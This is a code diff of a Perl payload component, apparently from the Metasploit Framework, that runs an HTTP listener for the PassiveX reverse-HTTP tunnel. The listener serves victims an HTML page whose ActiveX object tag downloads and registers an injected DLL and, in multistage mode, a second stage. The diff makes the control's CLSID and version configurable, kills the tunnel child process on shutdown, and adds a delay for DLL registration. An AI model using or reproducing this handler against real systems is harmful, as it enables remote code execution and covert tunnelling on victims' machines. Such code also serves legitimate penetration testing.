@@ -20,14 +20,6 @@
 ##
 ###############
 
-# TODO
-#
-# PXDLLCLSID - custom clsid
-# PXDLLVER   - dll version
-#
-# fix child pid cleanup
-#
-
 package Msf::PayloadComponent::PassiveXConnection;
 
 use strict;
@@ -39,12 +31,14 @@ my $info =
 {
 	'UserOpts'          =>
 		{
-			'PXHTTPHOST'  => [ 1, 'ADDR', 'Local HTTP listener hostname', "0.0.0.0"                             ],
-			'PXHTTPPORT'  => [ 1, 'PORT', 'Local HTTP listener port',     "8080"                                ],
-			'PXAXDLL'     => [ 1, 'DATA', 'ActiveX DLL to Inject',        "$RealBin/data/passivex/passivex.dll" ],
+			'PXHTTPHOST'  => [ 1, 'ADDR', 'Local HTTP listener hostname', "0.0.0.0"                              ],
+			'PXHTTPPORT'  => [ 1, 'PORT', 'Local HTTP listener port',     "8080"                                 ],
+			'PXAXDLL'     => [ 1, 'DATA', 'ActiveX DLL to Inject',        "$RealBin/data/passivex/passivex.dll"  ],
+			'PXAXCLSID'   => [ 1, 'DATA', 'ActiveX CLSID',                "B3AC7307-FEAE-4e43-B2D6-161E68ABA838" ],
+			'PXAXVER'     => [ 1, 'DATA', 'ActiveX DLL Version',          "-1,-1,-1,-1"                          ],
 		},
 	'MultistageInline'  => 1,
-	'Keys'              => ['passivex'],
+	'Keys'              => [ 'reversehttp', 'tunnel' ],
 };
 
 sub new 
@@ -153,6 +147,13 @@ sub ShutdownHandler
 {
 	my $self = shift;
 
+	if ($self->{'PxChildPid'})
+	{
+		kill('KILL', $self->{'PxChildPid'});
+
+		$self->{'PxChildPid'} = 0;
+	}
+
 	$self->PrintLine('[*] Exiting PassiveX Handler.');
 }
 
@@ -186,6 +187,8 @@ sub ProcessHttpRequest
 		{
 			# Format is http://[PXHTTPHOST]:[PXHTTPPORT]/passivex.dll
 			my $url = 'http://' . $self->GetHttpHost() . ":" . $self->GetHttpPort() . "/passivex.dll";
+			my $clsid = $self->GetVar('PXAXCLSID');
+			my $ver   = $self->GetVar('PXAXVER');
 			
 			$self->PrintLine('[*] Sending PassiveX main page to client...');
 
@@ -195,13 +198,13 @@ sub ProcessHttpRequest
 				"Content-type: text/html\r\n" .
 				"\r\n" .
 				"<html>" .
-					"<object classid=\"CLSID:B3AC7307-FEAE-4e43-B2D6-161E68ABA838\" codebase=\"$url#-1,-1,-1,-1\"> " .
+					"<object classid=\"CLSID:$clsid\" codebase=\"$url#$ver\">" .
 					(($self->IsMultistage()) ?	
 						"<param name=\"HttpHost\" value=\"" . $self->GetHttpHost() . "\">" .
 						"<param name=\"HttpPort\" value=\"" . $self->GetHttpPort() . "\">" .
 						"<param name=\"DownloadSecondStage\" value=\"1\">" :
-						"") . "
-					</object>" .
+						"") . 
+					"</object>" .
 				"</html>";
 		}
 		# If the request was for the ActiveX control itself...
@@ -426,6 +429,8 @@ sub StartMonitoringTunnelData
 	# If parent or error, return up...
 	if ($pid)
 	{
+		$self->{'PxChildPid'} = $pid;
+
 		return 1;
 	}
 
@@ -887,6 +892,16 @@ sub IsMultistage
 	my $self = shift;
 
 	return $self->_Info->{'Multistage'};
+}
+
+#
+# Wait 10 seconds to give time for the DLL to register
+#
+sub ExtraDelay
+{
+	my $self = shift;
+
+	sleep(10);
 }
 
 1;
